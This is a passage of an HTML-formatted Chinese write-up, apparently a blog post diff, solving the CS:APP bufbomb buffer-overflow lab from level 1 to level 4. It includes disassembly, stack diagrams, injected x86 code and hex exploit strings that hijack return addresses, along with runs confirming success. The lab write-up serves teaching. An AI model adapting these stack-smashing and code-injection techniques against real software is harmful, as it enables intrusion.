class="hljs-attribute">8048c57</span>:	c<span class="hljs-number">7</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">04</span> ee a<span class="hljs-number">4</span> <span class="hljs-number">04</span> 	movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">4</span>ee,<span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%esp)<br> <span class="hljs-attribute">8048c5e</span>:	<span class="hljs-number">08</span> <br> <span class="hljs-attribute">8048c5f</span>:	c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 	movl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,(%esp)<br> <span class="hljs-attribute">8048c66</span>:	e<span class="hljs-number">8</span> <span class="hljs-number">55</span> fd ff ff       	call   <span class="hljs-number">80489</span>c<span class="hljs-number">0</span> &lt;__printf_chk@plt&gt;<br> <span class="hljs-attribute">8048c6b</span>:	c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 	movl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,(%esp)<br> <span class="hljs-attribute">8048c72</span>:	e<span class="hljs-number">8</span> <span class="hljs-number">04</span> <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       	call   <span class="hljs-number">804937</span>b &lt;validate&gt;<br> <span class="hljs-attribute">8048c77</span>:	eb <span class="hljs-number">18</span>                	jmp    <span class="hljs-number">8048</span>c<span class="hljs-number">91</span> &lt;fizz+<span class="hljs-number">0</span>x<span class="hljs-number">4</span>f&gt;<br> <span class="hljs-attribute">8048c79</span>:	<span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>          	mov    %eax,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%esp)<br> <span class="hljs-attribute">8048c7d</span>:	c<span class="hljs-number">7</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">04</span> <span class="hljs-number">40</span> a<span class="hljs-number">3</span> <span class="hljs-number">04</span> 	movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">340</span>,<span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%esp)<br> <span class="hljs-attribute">8048c84</span>:	<span class="hljs-number">08</span> <br> <span class="hljs-attribute">8048c85</span>:	c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 	movl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,(%esp)<br> <span class="hljs-attribute">8048c8c</span>:	e<span class="hljs-number">8</span> <span class="hljs-number">2</span>f fd ff ff       	call   <span class="hljs-number">80489</span>c<span class="hljs-number">0</span> &lt;__printf_chk@plt&gt;<br> <span class="hljs-attribute">8048c91</span>:	c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 	movl   $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,(%esp)<br> <span class="hljs-attribute">8048c98</span>:	e<span class="hljs-number">8</span> <span class="hljs-number">63</span> fc ff ff       	call   <span class="hljs-number">8048900</span> &lt;exit@plt&gt;<br></code></pre></td></tr></table></figure>
+<p>为什么return addr和参数之间需要填充四个字节？这涉及到栈回收时候的操作：</p>
+<ul>
+<li>mov %ebp，%esp 。将esp指向ebp所指，相当于回收栈分配的空间</li>
+<li>pop ebp。恢复前栈指针，同时esp=esp+4，也即是指向返回地址。上面mov和pop语句可以用一个leave代替</li>
+<li>ret指令相当于pop eip，因此esp=esp+4，也即是指向返回地址+4处。因此第一个参数是在return addr+8的位置</li>
+</ul>
+<p>要注意到push和pop指令都隐含着esp的改变</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">--------------------------------------------------------------<br><br>`mov %ebp，%esp`<br><br>     high         ┌───────────┐<br>                  │           │<br>                  │   cookie  │<br>                  ├───────────┤<br>                  │           │<br>                  │           │<br>                  ├───────────┤<br>                  │           │<br>                  │<span class="hljs-keyword">return</span> addr│<br>                  │           │<br>                  ├───────────┤<br>esp  ebp  ───► <br>---------------------------------------------------------------<br><br>`pop ebp`<br><br><br>    ebp  ───►<br><br>                  ┌───────────┐<br>                  │           │<br>                  │   cookie  │<br>                  ├───────────┤<br>                  │           │<br>                  │           │                  <br>                  ├───────────┤<br>                  │           │<br>    esp  ───►     │<span class="hljs-keyword">return</span> addr│<br>                  │           │<br>                  ├───────────┤<br><br>---------------------------------------------------------------<br>`ret` 也即是 `pop eip`<br>  <br>    ebp  ───►<br><br>                  ┌───────────┐<br>                  │           │<br>                  │   cookie  │<br>                  ├───────────┤<br>                  │           │<br>    esp  ───►     │           │                  <br>                  ├───────────┤<br>                  │           │<br>    eip  ───►     │<span class="hljs-keyword">return</span> addr│<br>                  │           │<br>                  ├───────────┤<br><br><br><br>```                <br><br>exploit.txt<br><br></code></pre></td></tr></table></figure>
+<p>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>42 8c 04 08 /* 返回地址，小端序 <em>/<br>00 00 00 00 /</em> 见前面分析 <em>/<br>0e 56 85 61 /</em> cookie，也即是fizz函数的参数 */</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><br>输出<br><br>```<span class="hljs-built_in">shell</span><br>Userid: nmsl<br>Cookie: <span class="hljs-number">0x6185560e</span><br><span class="hljs-built_in">Type</span> <span class="hljs-keyword">string</span>:Fizz!: You called <span class="hljs-built_in">fizz</span>(<span class="hljs-number">0x6185560e</span>)<br>VALID<br>NICE JOB!<br></code></pre></td></tr></table></figure>
+
+<h1 id="level-2-Firecracker-15-pts"><a href="#level-2-Firecracker-15-pts" class="headerlink" title="level 2 Firecracker(15 pts)"></a>level 2 Firecracker(15 pts)</h1><p>这一次我们需要调用函数bang，由于bang中会验证全局变量global_value是否等于cookie，因此需要在堆栈中注入代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> global_value = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bang</span><span class="hljs-params">(<span class="hljs-keyword">int</span> val)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (global_value == cookie) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value);<br>        validate(<span class="hljs-number">2</span>);<br>    &#125; <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<ul>
+<li><p>将返回地址修改为buf[0]的地址80491CC，getbuf函数将会跳到buf[0]，然后执行此处的代码</p>
+</li>
+<li><p>注入代码：</p>
+<ul>
+<li>修改global_value的值为cookie</li>
+<li>将bang函数的地址压入栈，后跟一个ret指令</li>
+</ul>
+</li>
+<li><p>反汇编得到bang的地址为0x08048c9d</p>
+</li>
+<li><p>global_value的地址为0x804d100</p>
+</li>
+<li><p>Userid: nmsl Cookie: 0x6185560e</p>
+</li>
+</ul>
+<p>需要注入的代码：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">movl</span>  $<span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e,%eax<br><span class="hljs-attribute">movl</span> %eax,<span class="hljs-number">0</span>x<span class="hljs-number">804</span>d<span class="hljs-number">100</span>     //将正确的cookie赋给global_value<br><span class="hljs-attribute">push</span> $<span class="hljs-number">0</span>x<span class="hljs-number">08048</span>c<span class="hljs-number">9</span>d        //bang的地址压栈<br><span class="hljs-attribute">ret</span>                     //等同于 pop eip，跳转到bang并执行<br></code></pre></td></tr></table></figure>
+
+<p>汇编<code> gcc -m32 -c 1.s</code></p>
+<p>再使用objdump反汇编得到二进制代码</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Disassembly</span> of section .text:<br><br><span class="hljs-attribute">00000000</span> &lt;.text&gt;:<br>   <span class="hljs-attribute">0</span>:   b<span class="hljs-number">8</span> <span class="hljs-number">0</span>e <span class="hljs-number">56</span> <span class="hljs-number">85</span> <span class="hljs-number">61</span>          mov    $<span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e,%eax<br>   <span class="hljs-attribute">5</span>:   a<span class="hljs-number">3</span> <span class="hljs-number">00</span> d<span class="hljs-number">1</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span>          mov    %eax,<span class="hljs-number">0</span>x<span class="hljs-number">804</span>d<span class="hljs-number">100</span><br>   <span class="hljs-attribute">a</span>:   ff <span class="hljs-number">35</span> <span class="hljs-number">9</span>d <span class="hljs-number">8</span>c <span class="hljs-number">04</span> <span class="hljs-number">08</span>       pushl  <span class="hljs-number">0</span>x<span class="hljs-number">8048</span>c<span class="hljs-number">9</span>d<br>  <span class="hljs-attribute">10</span>:   c<span class="hljs-number">3</span>                      ret    <br></code></pre></td></tr></table></figure>
+
+<p>exploit.txt</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">b8</span> <span class="hljs-number">0</span>e <span class="hljs-number">56</span> <span class="hljs-number">85</span> <span class="hljs-number">61</span><br><span class="hljs-attribute">a3</span> <span class="hljs-number">00</span> d<span class="hljs-number">1</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span><br><span class="hljs-attribute">68</span> <span class="hljs-number">9</span>d <span class="hljs-number">8</span>c <span class="hljs-number">04</span> <span class="hljs-number">08</span><br><span class="hljs-attribute">c3</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">28</span> <span class="hljs-number">38</span> <span class="hljs-number">68</span> <span class="hljs-number">55</span> //要注意这个缓冲区的首地址,buf[<span class="hljs-number">0</span>]在堆栈段<br></code></pre></td></tr></table></figure>
+<p>验证：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> exploit.txt | ./hex<span class="hljs-number">2</span>raw  | ./bufbomb -u nmsl<br><br><span class="hljs-attribute">Userid</span>: nmsl<br><span class="hljs-attribute">Cookie</span>: <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Type</span> string:Bang!: You set global_value to <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">VALID</span><br><span class="hljs-attribute">NICE</span> JOB!<br></code></pre></td></tr></table></figure>
+
+
+<h1 id="Level-3-Dynamite-20-pts"><a href="#Level-3-Dynamite-20-pts" class="headerlink" title="Level 3: Dynamite (20 pts)"></a>Level 3: Dynamite (20 pts)</h1><p>之前的代码注入会破坏堆栈的栈平衡（比如覆盖了ebp的值），使得程序异常退出，level 3需要将在不改变程序执行流的情况下，改写getbuf函数的返回值，并返回到test函数中继续执行</p>
+<ul>
+<li>观察C语言代码，test函数call getbuf函数的下一条语句是，<code>if (local != uniqueval()) &#123;</code>，那么这就是从getbuf函数返回后要执行的代码的地址。为<code>0x8048dbe</code></li>
+<li>getbuf原先的返回值是1，现在需要改为cookie的值，按照约定，返回值被保存在eax寄存器（也可以从test函数的反汇编结果观察验证）</li>
+<li>ebp的值不能被改变，因此需要动态调试得到ebp的原始值。为<code>0x55683880</code></li>
+<li>原先的return addr需要改为Gets函数所读入的字符串的地址<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><br><br><br><br><br>                       ┌───────────┐<br>                       │           │<br>                       │<span class="hljs-keyword">return</span> addr│ ───────────────────┐<br>                       │           │                    │<br>                       ├───────────┤                    │<br>                       │           │                    │<br>    cant be modifie    │ old ebp   │                    │<br>                       │           │                    │<br>                       ├───────────┤                    │<br>                       │           │                    │<br>                       │   ....    │                    │<br>                       ├───────────┤                    │<br>                       │           │                    │<br>                       │  ret      │                    │<br>                       ├───────────┤                    │<br>                       │  push     │                    │<br>                       │  retadd   │                    │<br>                       ├───────────┤                    │<br>                       │           │ ◄──────────────────┘<br>      buf[<span class="hljs-number">0</span>] addr      │  <span class="hljs-built_in">set</span> eax  │<br>                       └───────────┘<br><br><br><br><br> <span class="hljs-keyword">int</span> getbuf()<br> &#123;<br>    <span class="hljs-keyword">char</span> buf[NORMAL_BUFFER_SIZE];<br>    Gets(buf);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br> &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> val;<br>    <span class="hljs-comment">/* Put canary on stack to detect possible corruption */</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">int</span> local = uniqueval();<br><br>    val = getbuf();<br><br>    <span class="hljs-comment">/* Check for corrupted stack */</span><br>    <span class="hljs-keyword">if</span> (local != uniqueval()) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val == cookie) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val);<br>        validate(<span class="hljs-number">3</span>);<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+注入代码<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">movl</span>  $<span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e,%eax<br><span class="hljs-attribute">push</span> $<span class="hljs-number">0</span>x<span class="hljs-number">8048</span>dbe<br><span class="hljs-attribute">ret</span><br></code></pre></td></tr></table></figure>
+对应的二进制字节<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">Disassembly</span> of section .text:<br><br><span class="hljs-attribute">00000000</span> &lt;.text&gt;:<br>   <span class="hljs-attribute">0</span>:   b<span class="hljs-number">8</span> <span class="hljs-number">0</span>e <span class="hljs-number">56</span> <span class="hljs-number">85</span> <span class="hljs-number">61</span>          mov    $<span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e,%eax<br>   <span class="hljs-attribute">5</span>:   <span class="hljs-number">68</span> be <span class="hljs-number">8</span>d <span class="hljs-number">04</span> <span class="hljs-number">08</span>          push   $<span class="hljs-number">0</span>x<span class="hljs-number">8048</span>dbe<br>   <span class="hljs-attribute">a</span>:   c<span class="hljs-number">3</span>                      ret    <br></code></pre></td></tr></table></figure></li>
+</ul>
+<p>exploit.txt</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">b8</span> <span class="hljs-number">0</span>e <span class="hljs-number">56</span> <span class="hljs-number">85</span> <span class="hljs-number">61</span><br><span class="hljs-attribute">68</span> be <span class="hljs-number">8</span>d <span class="hljs-number">04</span> <span class="hljs-number">08</span><br><span class="hljs-attribute">c3</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">80</span> <span class="hljs-number">38</span> <span class="hljs-number">68</span> <span class="hljs-number">55</span><br><span class="hljs-attribute">28</span> <span class="hljs-number">38</span> <span class="hljs-number">68</span> <span class="hljs-number">55</span><br></code></pre></td></tr></table></figure>
+
+<p>测试</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> exploit.txt | ./hex<span class="hljs-number">2</span>raw  | ./bufbomb -u nmsl<br><br><span class="hljs-attribute">Userid</span>: nmsl<br><span class="hljs-attribute">Cookie</span>: <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Type</span> string:Boom!: getbuf returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">VALID</span><br><span class="hljs-attribute">NICE</span> JOB!<br></code></pre></td></tr></table></figure>
+
+<h1 id="Level-4-Nitroglycerin-10-pts"><a href="#Level-4-Nitroglycerin-10-pts" class="headerlink" title="Level 4: Nitroglycerin (10 pts)"></a>Level 4: Nitroglycerin (10 pts)</h1><p>要求：</p>
+<ul>
+<li>使用-n选项运行，这会使程序调用testn、getbufn函数，而非之前的test、getbuf函数</li>
+<li>getbufn函数会被调用5次</li>
+<li>每一次输入的字符串都相同</li>
+</ul>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">08048e26</span> &lt;testn&gt;:<br> <span class="hljs-attribute">8048e26</span>:	<span class="hljs-number">55</span>                   	push   %ebp<br> <span class="hljs-attribute">8048e27</span>:	<span class="hljs-number">89</span> e<span class="hljs-number">5</span>                	mov    %esp,%ebp<br> <span class="hljs-attribute">8048e29</span>:	<span class="hljs-number">53</span>                   	push   %ebx<br> <span class="hljs-attribute">8048e2a</span>:	<span class="hljs-number">83</span> ec <span class="hljs-number">24</span>             	sub    $<span class="hljs-number">0</span>x<span class="hljs-number">24</span>,%esp<br> <span class="hljs-attribute">8048e2d</span>:	e<span class="hljs-number">8</span> <span class="hljs-number">5</span>e ff ff ff       	call   <span class="hljs-number">8048</span>d<span class="hljs-number">90</span> &lt;uniqueval&gt;<br> <span class="hljs-attribute">8048e32</span>:	<span class="hljs-number">89</span> <span class="hljs-number">45</span> f<span class="hljs-number">4</span>             	mov    %eax,-<span class="hljs-number">0</span>xc(%ebp)<br> <span class="hljs-attribute">8048e35</span>:	e<span class="hljs-number">8</span> d<span class="hljs-number">2</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       	call   <span class="hljs-number">804920</span>c &lt;getbufn&gt;<br> <span class="hljs-attribute">8048e3a</span>:	<span class="hljs-number">89</span> c<span class="hljs-number">3</span>                	mov    %eax,%ebx<br> <span class="hljs-attribute">8048e3c</span>:	e<span class="hljs-number">8</span> <span class="hljs-number">4</span>f ff ff ff       	call   <span class="hljs-number">8048</span>d<span class="hljs-number">90</span> &lt;uniqueval&gt;<br> <span class="hljs-attribute">8048e41</span>:	<span class="hljs-number">8</span>b <span class="hljs-number">55</span> f<span class="hljs-number">4</span>             	mov    -<span class="hljs-number">0</span>xc(%ebp),%edx<br> <span class="hljs-attribute">8048e44</span>:	<span class="hljs-number">39</span> d<span class="hljs-number">0</span>                	cmp    %edx,%eax<br> <span class="hljs-attribute">8048e46</span>:	<span class="hljs-number">74</span> <span class="hljs-number">0</span>e                	je     <span class="hljs-number">8048</span>e<span class="hljs-number">56</span> &lt;testn+<span class="hljs-number">0</span>x<span class="hljs-number">30</span>&gt;<br> <span class="hljs-attribute">8048e48</span>:	c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">88</span> a<span class="hljs-number">3</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span> 	movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">388</span>,(%esp)<br> <span class="hljs-attribute">8048e4f</span>:	e<span class="hljs-number">8</span> <span class="hljs-number">6</span>c fa ff ff       	call   <span class="hljs-number">80488</span>c<span class="hljs-number">0</span> &lt;puts@plt&gt;<br> <span class="hljs-attribute">8048e54</span>:	eb <span class="hljs-number">46</span>                	jmp    <span class="hljs-number">8048</span>e<span class="hljs-number">9</span>c &lt;testn+<span class="hljs-number">0</span>x<span class="hljs-number">76</span>&gt;<br> <span class="hljs-attribute">8048e56</span>:	<span class="hljs-number">3</span>b <span class="hljs-number">1</span>d <span class="hljs-number">08</span> d<span class="hljs-number">1</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span>    	cmp    <span class="hljs-number">0</span>x<span class="hljs-number">804</span>d<span class="hljs-number">108</span>,%ebx<br> <span class="hljs-attribute">8048e5c</span>:	<span class="hljs-number">75</span> <span class="hljs-number">26</span>                	jne    <span class="hljs-number">8048</span>e<span class="hljs-number">84</span> &lt;testn+<span class="hljs-number">0</span>x<span class="hljs-number">5</span>e&gt;<br> <span class="hljs-attribute">8048e5e</span>:	<span class="hljs-number">89</span> <span class="hljs-number">5</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span>          	mov    %ebx,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%esp)<br> <span class="hljs-attribute">8048e62</span>:	c<span class="hljs-number">7</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">04</span> b<span class="hljs-number">4</span> a<span class="hljs-number">3</span> <span class="hljs-number">04</span> 	movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">3</span>b<span class="hljs-number">4</span>,<span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%esp)<br> <span class="hljs-attribute">8048e69</span>:	<span class="hljs-number">08</span> <br> <span class="hljs-attribute">8048e6a</span>:	c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 	movl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,(%esp)<br> <span class="hljs-attribute">8048e71</span>:	e<span class="hljs-number">8</span> <span class="hljs-number">4</span>a fb ff ff       	call   <span class="hljs-number">80489</span>c<span class="hljs-number">0</span> &lt;__printf_chk@plt&gt;<br> <span class="hljs-attribute">8048e76</span>:	c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span 